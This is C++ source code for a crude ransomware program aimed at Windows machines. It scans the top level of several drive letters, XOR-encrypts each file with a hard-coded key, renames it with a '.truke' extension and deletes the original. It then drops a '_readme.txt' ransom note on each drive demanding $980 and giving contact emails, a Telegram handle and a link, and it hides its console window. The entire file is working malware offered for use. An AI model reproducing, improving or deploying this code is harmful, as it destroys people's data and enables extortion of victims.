//This file encrypts files

#include <iostream>
#include <dirent.h>
#include <fstream>
#include <Windows.h>

using namespace std;
  /*A function that receives and encodes files, stores the encryption output in another file
    , and deletes the original file */
 void enc( const char * file )
{
    string nameFile=file;
    int num_index=nameFile.length();  //The length of the file name
    
     if(  file[num_index-5]=='t' &&  file[num_index-4]=='r' &&  file[num_index-3]=='u')  //Check file extension
     cout<<"the file complete\n";
     else
    {
	nameFile+=".truke";  
    //string test=tool+".truke"; //Add the new extension .truke
	ifstream inFile;   //Object readable from a file
    ofstream outFile;  //Object to write to a file
	string key = "Encryp_Decryp";
	// Input
	inFile.open(file, ios::in | ios::binary);
    cout<<file;
    //inFile.open("rawan.docx", ios::in | ios::binary);
    string str((istreambuf_iterator<char>(inFile)), istreambuf_iterator<char>()); // Reads a text file into a single string.
    inFile.close();
    cout << "The file has been read into memory as follows:" << endl;   
    

    // Encryption
    //str.size()//This function is used to return the length of the string in terms of bytes.
    cout << "The file has been encrypted as follows:" << endl;
    for (unsigned x = 0; x < str.size(); x++)           // Steps through the characters of the string.
        str[x] ^= key[x % key.size()];                  // Cycles through a multi-character encryption key, and encrypts the character using an XOR bitwise encryption.
    // Write Encrypted File 
    
   outFile.open(nameFile.c_str() , ios::out | ios::binary);
   
    outFile.write(str.c_str(), str.size());         // Writes the string to the binary file by first converting it to a C-String using the .c_str member function.
     outFile.close();
    remove(file); //Delete a original file
}
}

void HideConsole()  //Function to hide the run screen after execution
{    ::ShowWindow(::GetConsoleWindow(), SW_HIDE); }

    void readme(const char *exti)  //A threatening message to a victim
    {
        ofstream outFile;	
        outFile.open(exti);
     
        outFile<<  "ATTENTION!\n\n";
        outFile<<"Don't worry, you can return all your files!\n";
 		outFile<<"All your files like photos, databases, documents and other important are encrypted with strongest encryption and unique key.\n";
 		outFile<<"The only method of recovering files is to purchase decrypt tool and unique key for you.\n";
 		outFile<<"This software will decrypt all your encrypted files.\n";
 		outFile<<"What guarantees you have?\n";
 		outFile<<"You can send one of your encrypted file from your PC and we decrypt it for free.\n";
 		outFile<<"But we can decrypt only 1 file for free. File must not contain valuable information.\n";
 		outFile<<"You can get and look video overview decrypt tool:\n";
 		outFile<<"https://we.tl/t-xHnpiAalxT\n";
	    outFile<<"Price of private key and decrypt software is $980.\n";
 		outFile<<"Discount 50% available if you contact us first 72 hours, that's price for you is $490.\n";
 		outFile<<"Please note that you'll never restore your data without payment.\n";
 		outFile<<"Check your e-mail Spam or Junk folder if you don't get answer more than 6 hours.\n\n\n";
 		outFile<<"To get this software you need write on our e-mail:\n";
 		outFile<<"gorentos@bitmessage.ch\n\n";
 		outFile<<"Reserve e-mail address to contact us:\n";
 		outFile<<"ferast@firemail.cc\n\n";
 		outFile<<"Our Telegram account:\n";
 		outFile<<"@datarestore\n\n";
 		outFile<<"Your personal ID:\n";
 		outFile<<"105ASdiuew74yiljfgdujYdwNRV1HUy*************AwHMlpGLeRgo\n"; 	
 		outFile.close();			
	}


     int main(void)
    {
    string Conver; //Variable declaration conver
    string pass;//Variable declaration pass
    char * fileName;//Variable declaration fileName
    DIR *d;
    struct dirent *dir;
    const char * a[]= {"D:/","F:/","E:/","C:/","J:/","H:/","I:/","G:/"};//Reserve an array of disk names
     for(int hard=0 ; hard<=3; hard++) //Pass all discs to view the decrypted files
     {
      const  char * v=	a[hard];
      d = opendir(v);
      if (d)
      {
        while ((dir = readdir(d)) != NULL)
        {
        fileName= dir->d_name;//A function that returns the name and extension of files
        int p=  dir->d_namlen;//A function that returns the number of characters of the name and extension
              if(fileName[p-4]=='.'||fileName[p-5]=='.')
   	            {
			       if(v=="D:/" )   //Scan desk d &And send files to Encrypt and copy a message in each disk
			       { Conver=fileName;   pass="D:/"+ Conver;  enc(pass.c_str() );  readme("D:/_readme.txt");}
			 	 
				     else if(v=="C:/")  //Scan desk d &And send files to Encrypt and copy a message in each disk
				     { Conver=fileName;   pass="C:/"+ Conver;  enc(pass.c_str());  readme("C:/_readme.txt");}
		
			           else if(v=="F:/")  //Scan desk d &And send files to Encrypt and copy a message in each disk
				       {Conver=fileName;   pass="F:/"+ Conver;  enc(pass.c_str());  readme("F:/_readme.txt");}
				  
				         else if(v=="E:/")  //Scan desk d &And send files to Encrypt and copy a message in each disk
				         {Conver=fileName;   pass="E:/"+ Conver;  enc(pass.c_str());  readme("E:/_readme.txt");}
				   
				           else if(v=="J:/")  //Scan desk d &And send files to Encrypt and copy a message in each disk
				           {Conver=fileName;   pass="J:/"+ Conver;  enc(pass.c_str());  readme("J:/_readme.txt");}
				   
				  			 else if(v=="H:/")  //Scan desk d &And send files to Encrypt and copy a message in each disk
				  			 {Conver=fileName;   pass="H:/"+ Conver;  enc(pass.c_str());  readme("H:/_readme.txt");}
				   
				  			   else if(v=="G:/")  //Scan desk d &And send files to Encrypt and copy a message in each disk
				 			   {Conver=fileName;   pass="G:/"+ Conver;  enc(pass.c_str());  readme("G:/_readme.txt");}
				   
				  				 else if(v=="I:/")  //Scan desk d &And send files to Encrypt and copy a message in each disk
				  				 {Conver=fileName;   pass="I:/"+ Conver;  enc(pass.c_str());  readme("I:/_readme.txt");}
				   
		    	}
		}	
     }
        closedir(d);	
  }
     HideConsole();//callind function

    return(0);
}

